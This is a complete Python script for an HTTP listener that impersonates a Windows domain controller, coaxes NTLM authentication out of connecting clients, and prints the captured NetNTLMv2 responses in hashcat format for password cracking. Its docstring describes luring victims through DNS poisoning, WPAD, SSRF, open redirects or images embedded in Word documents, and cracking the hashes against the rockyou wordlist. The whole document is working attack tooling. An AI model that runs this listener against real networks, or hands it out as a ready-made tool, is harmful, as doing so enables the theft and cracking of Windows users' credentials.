#!/usr/bin/env python3
"""
HTTP NTLM capture listener (NetNTLMv2) for crackable hash extraction.

Why a custom listener?
- Naive BaseHTTPRequestHandler listeners use HTTP/1.0 — connection closes between
  NTLM Type 1 (NEGOTIATE) and Type 3 (AUTHENTICATE), so the client never returns
  Type 3. NTLM is connection-bound; we MUST keep-alive HTTP/1.1.
- A static Type 2 with wrong/missing NEGOTIATE flags causes modern Windows clients
  (PowerShell Invoke-WebRequest, .NET HttpClient, Edge intranet zone) to RST. We
  echo client flags from Type 1 and add the required server flags + AV pairs.
- We advertise BOTH `WWW-Authenticate: Negotiate` and `WWW-Authenticate: NTLM` so
  the client picks the mechanism its current context supports.

Output:
- Per request: prints `Hash: user::domain:srv_challenge:NTProofStr:blob` ready
  for `hashcat -m 5600`.

Usage:
    sudo python3 ntlm-http-listener.py 0.0.0.0 80
    # Trigger via DNS poisoning / WPAD / SSRF / open redirect / Word-doc image src
    # Crack with: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
"""
import os
import struct
import sys
import base64
import binascii
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# --- NTLMSSP NEGOTIATE flag constants ---------------------------------------
NEGOTIATE_UNICODE                 = 0x00000001
NEGOTIATE_OEM                     = 0x00000002
REQUEST_TARGET                    = 0x00000004
NEGOTIATE_NTLM                    = 0x00000200
NEGOTIATE_ALWAYS_SIGN             = 0x00008000
TARGET_TYPE_DOMAIN                = 0x00010000
NEGOTIATE_EXTENDED_SESSIONSECURITY= 0x00080000
NEGOTIATE_TARGET_INFO             = 0x00800000
NEGOTIATE_VERSION                 = 0x02000000
NEGOTIATE_128                     = 0x20000000
NEGOTIATE_KEY_EXCH                = 0x40000000
NEGOTIATE_56                      = 0x80000000

# AV pair types
MsvAvEOL              = 0x0000
MsvAvNbComputerName   = 0x0001
MsvAvNbDomainName     = 0x0002
MsvAvDnsComputerName  = 0x0003
MsvAvDnsDomainName    = 0x0004
MsvAvTimestamp        = 0x0007

# --- Tunables (set to plausible AD strings; some clients log these) ---------
DOMAIN_NB   = b"DOMAIN"
COMPUTER_NB = b"DC01"
DOMAIN_DNS  = b"domain.local"
COMPUTER_DNS= b"dc01.domain.local"


def _utf16(s: bytes) -> bytes:
    return s.decode().encode("utf-16-le")


def _av_pair(av_type: int, value: bytes) -> bytes:
    return struct.pack("<HH", av_type, len(value)) + value


def _build_target_info() -> bytes:
    av  = _av_pair(MsvAvNbDomainName,    _utf16(DOMAIN_NB))
    av += _av_pair(MsvAvNbComputerName,  _utf16(COMPUTER_NB))
    av += _av_pair(MsvAvDnsDomainName,   _utf16(DOMAIN_DNS))
    av += _av_pair(MsvAvDnsComputerName, _utf16(COMPUTER_DNS))
    # Windows FILETIME (100-ns intervals since 1601). Any current value works.
    import time as _t
    ft = int((_t.time() + 11644473600) * 1e7)
    av += _av_pair(MsvAvTimestamp, struct.pack("<Q", ft))
    av += _av_pair(MsvAvEOL, b"")
    return av


def build_type2(client_flags: int) -> bytes:
    """Type 2 (CHALLENGE) message echoing client flags + adding server flags."""
    target_name = _utf16(DOMAIN_NB)
    target_info = _build_target_info()
    challenge   = os.urandom(8)

    server_flags = (
        NEGOTIATE_UNICODE | REQUEST_TARGET | NEGOTIATE_NTLM
        | NEGOTIATE_ALWAYS_SIGN | TARGET_TYPE_DOMAIN
        | NEGOTIATE_EXTENDED_SESSIONSECURITY | NEGOTIATE_TARGET_INFO
        | NEGOTIATE_VERSION | NEGOTIATE_128 | NEGOTIATE_KEY_EXCH | NEGOTIATE_56
    )
    flags = client_flags | server_flags

    # Layout: signature(8) type(4) targetNameFields(8) flags(4) challenge(8)
    #         reserved(8) targetInfoFields(8) version(8) payload
    payload_off = 8 + 4 + 8 + 4 + 8 + 8 + 8 + 8  # = 56
    tn_off = payload_off
    ti_off = tn_off + len(target_name)

    msg  = b"NTLMSSP\x00"
    msg += struct.pack("<I", 2)                       # MessageType = CHALLENGE
    msg += struct.pack("<HHI", len(target_name), len(target_name), tn_off)
    msg += struct.pack("<I", flags)
    msg += challenge
    msg += b"\x00" * 8                                 # Reserved
    msg += struct.pack("<HHI", len(target_info), len(target_info), ti_off)
    msg += b"\x06\x01\xb1\x1d\x00\x00\x00\x0f"        # Version (Win 6.1)
    msg += target_name + target_info
    return msg


def parse_type3(blob: bytes):
    """Extract NetNTLMv2 fields → 'user::domain:chal:NTProofStr:blob' (-m 5600)."""
    if blob[:8] != b"NTLMSSP\x00" or struct.unpack("<I", blob[8:12])[0] != 3:
        return None
    # Field offsets in Type 3 header
    nt_len, _, nt_off  = struct.unpack("<HHI", blob[20:28])
    dom_len, _, dom_off= struct.unpack("<HHI", blob[28:36])
    usr_len, _, usr_off= struct.unpack("<HHI", blob[36:44])
    # Need server challenge from the Type 2 we sent — pulled from per-conn state
    nt_resp = blob[nt_off:nt_off + nt_len]
    user    = blob[usr_off:usr_off + usr_len].decode("utf-16-le", errors="replace")
    domain  = blob[dom_off:dom_off + dom_len].decode("utf-16-le", errors="replace")
    if len(nt_resp) <= 24:
        return None  # NTLMv1 — not what we want
    nt_proof  = binascii.hexlify(nt_resp[:16]).decode()
    nt_blob   = binascii.hexlify(nt_resp[16:]).decode()
    return user, domain, nt_proof, nt_blob


class NTLMHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"   # MANDATORY — NTLM is connection-bound
    server_challenge = None

    def _send_401(self, ntlm_payload_b64: str = None):
        self.send_response(401)
        if ntlm_payload_b64:
            self.send_header("WWW-Authenticate", f"NTLM {ntlm_payload_b64}")
        else:
            self.send_header("WWW-Authenticate", "Negotiate")
            self.send_header("WWW-Authenticate", "NTLM")
        self.send_header("Content-Length", "0")
        self.send_header("Connection", "Keep-Alive")
        self.end_headers()

    def do_GET(self):  # noqa: N802 — http.server convention
        auth = self.headers.get("Authorization", "")
        if not auth or not auth.startswith("NTLM "):
            return self._send_401()

        try:
            data = base64.b64decode(auth[5:])
        except Exception:
            return self._send_401()

        if data[:8] != b"NTLMSSP\x00":
            return self._send_401()

        msg_type = struct.unpack("<I", data[8:12])[0]
        if msg_type == 1:
            # Type 1 (NEGOTIATE) — extract client flags, build & return Type 2
            client_flags = struct.unpack("<I", data[12:16])[0]
            t2 = build_type2(client_flags)
            self.server_challenge = t2[24:32]
            return self._send_401(base64.b64encode(t2).decode())
        elif msg_type == 3:
            parsed = parse_type3(data)
            if parsed:
                user, domain, nt_proof, nt_blob = parsed
                # NetNTLMv2 hashcat -m 5600 format
                if not self.server_challenge:
                    print("[!] Type 3 without prior Type 2 challenge state")
                else:
                    chal = binascii.hexlify(self.server_challenge).decode()
                    print(f"Hash: {user}::{domain}:{chal}:{nt_proof}:{nt_blob}")
            self.send_response(200)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return

        self._send_401()

    do_POST = do_PUT = do_HEAD = do_GET

    def log_message(self, fmt, *args):  # quieter
        sys.stderr.write("[%s] %s\n" % (self.address_string(), fmt % args))


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    srv = ThreadingHTTPServer((host, port), NTLMHandler)
    print(f"[+] NTLM HTTP listener on {host}:{port} (HTTP/1.1, keep-alive)")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        srv.server_close()
